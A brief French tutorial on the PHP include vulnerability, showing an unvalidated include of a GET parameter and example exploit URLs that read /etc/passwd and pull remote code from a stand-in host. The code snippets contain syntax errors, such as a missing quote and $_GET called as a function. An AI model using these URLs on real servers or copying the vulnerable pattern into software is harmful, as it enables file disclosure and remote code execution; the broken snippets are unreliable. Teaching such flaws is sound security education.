# La faille include

La fonction include() en PHP sert a executer du code php qui se situe dans un autre fichier. Exemple: 

```
<?php

include(bth.php)
```

Dans ce cas, c'est le code dans bth.php qui sera executé.

Si par contre le développeur écrit ce code :

```
<?php

include($_GET('file'));
```

Pour exploiter cette faille, on peut utiliser l'URL suivante :

>monsite.tld/index.php?file=/etc/passwd

Ici la fonction "include" va inclure le texte du fichier "/etc/passwd", et donc afficher son contenu. Il est possible de changer "/etc/passwd" en un autre fichier du serveur qui n'est normalement pas accesible, ou même par du code distant accessible sur un autre serveur.

Exemple : 

>monsite.tld/index.php?file=http://badsite.tmld/script.txt

